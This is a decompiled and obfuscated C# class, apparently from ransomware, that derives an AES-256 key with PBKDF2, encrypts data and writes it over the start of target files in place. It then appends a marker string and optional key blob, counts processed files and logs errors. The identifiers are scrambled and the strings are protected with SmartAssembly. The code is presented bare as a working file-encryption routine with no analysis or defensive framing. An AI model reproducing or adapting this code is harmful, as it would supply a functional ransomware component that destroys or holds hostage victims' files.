using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace jtAYXTgtXeY;

public static class gXMFgMIeYcrF
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] VFZJqJWFkaov(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = LkkSqLYdlIitpC(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes LkkSqLYdlIitpC(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] uIceXfBFVURI(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (efoRmwagKuQD.kVikcklGsTH == getString_0(107396997))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (efoRmwagKuQD.WkkVnLAdbtG)
			{
				try
				{
					File.AppendAllText(efoRmwagKuQD.PhOHjwgFpwoPkI, getString_0(107385261) + string_0 + getString_0(107399888) + ex.Message + getString_0(107396430));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool EvSGvxrPMdCC(string iupuKHitGzgBt, byte[] toVAoGNjbAD, byte[] uEkxZDiROSW = null)
	{
		try
		{
			byte[] array = null;
			if (efoRmwagKuQD.kVikcklGsTH == getString_0(107396997))
			{
				array = (efoRmwagKuQD.csOkMUvFRZv ? Encoding.ASCII.GetBytes(efoRmwagKuQD.UPTUMFgiFSZjXAR(efoRmwagKuQD.kMCWJkiChJOZyQGt) + efoRmwagKuQD.UPTUMFgiFSZjXAR(getString_0(107399830)) + Convert.ToString(efoRmwagKuQD.YyzRRVpMLORcsyqnO) + efoRmwagKuQD.UPTUMFgiFSZjXAR(getString_0(107399830))) : Encoding.ASCII.GetBytes(efoRmwagKuQD.UPTUMFgiFSZjXAR(efoRmwagKuQD.kMCWJkiChJOZyQGt) + efoRmwagKuQD.UPTUMFgiFSZjXAR(getString_0(107399807)) + Convert.ToString(efoRmwagKuQD.YyzRRVpMLORcsyqnO) + efoRmwagKuQD.UPTUMFgiFSZjXAR(getString_0(107399807))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(iupuKHitGzgBt, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(toVAoGNjbAD, 0, toVAoGNjbAD.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(iupuKHitGzgBt, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!efoRmwagKuQD.csOkMUvFRZv)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(uEkxZDiROSW, 0, uEkxZDiROSW.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (efoRmwagKuQD.csOkMUvFRZv ? Encoding.ASCII.GetBytes(efoRmwagKuQD.UPTUMFgiFSZjXAR(efoRmwagKuQD.kMCWJkiChJOZyQGt) + efoRmwagKuQD.UPTUMFgiFSZjXAR(getString_0(107399830)) + Convert.ToString(efoRmwagKuQD.YyzRRVpMLORcsyqnO) + efoRmwagKuQD.UPTUMFgiFSZjXAR(getString_0(107399830))) : Encoding.ASCII.GetBytes(efoRmwagKuQD.UPTUMFgiFSZjXAR(efoRmwagKuQD.kMCWJkiChJOZyQGt) + efoRmwagKuQD.UPTUMFgiFSZjXAR(getString_0(107399807)) + Convert.ToString(efoRmwagKuQD.YyzRRVpMLORcsyqnO) + efoRmwagKuQD.UPTUMFgiFSZjXAR(getString_0(107399807))));
				FileStream fileStream2 = new FileStream(iupuKHitGzgBt, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(toVAoGNjbAD, 0, toVAoGNjbAD.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(iupuKHitGzgBt, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!efoRmwagKuQD.csOkMUvFRZv)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(uEkxZDiROSW, 0, uEkxZDiROSW.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			efoRmwagKuQD.LFhiMkBTtnH++;
		}
		catch (Exception ex)
		{
			if (efoRmwagKuQD.WkkVnLAdbtG)
			{
				try
				{
					File.AppendAllText(efoRmwagKuQD.PhOHjwgFpwoPkI, getString_0(107385261) + iupuKHitGzgBt + getString_0(107399821) + ex.Message + getString_0(107396430));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (efoRmwagKuQD.csOkMUvFRZv ? Encoding.ASCII.GetBytes(efoRmwagKuQD.UPTUMFgiFSZjXAR(efoRmwagKuQD.kMCWJkiChJOZyQGt) + efoRmwagKuQD.UPTUMFgiFSZjXAR(getString_0(107399830)) + Convert.ToString(efoRmwagKuQD.YyzRRVpMLORcsyqnO) + efoRmwagKuQD.UPTUMFgiFSZjXAR(getString_0(107399830))) : Encoding.ASCII.GetBytes(efoRmwagKuQD.UPTUMFgiFSZjXAR(efoRmwagKuQD.kMCWJkiChJOZyQGt) + efoRmwagKuQD.UPTUMFgiFSZjXAR(getString_0(107399807)) + Convert.ToString(efoRmwagKuQD.YyzRRVpMLORcsyqnO) + efoRmwagKuQD.UPTUMFgiFSZjXAR(getString_0(107399807))));
				FileStream fileStream4 = new FileStream(iupuKHitGzgBt, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(toVAoGNjbAD, 0, toVAoGNjbAD.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(iupuKHitGzgBt, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!efoRmwagKuQD.csOkMUvFRZv)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(uEkxZDiROSW, 0, uEkxZDiROSW.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static gXMFgMIeYcrF()
	{
		Strings.CreateGetStringDelegate(typeof(gXMFgMIeYcrF));
	}
}
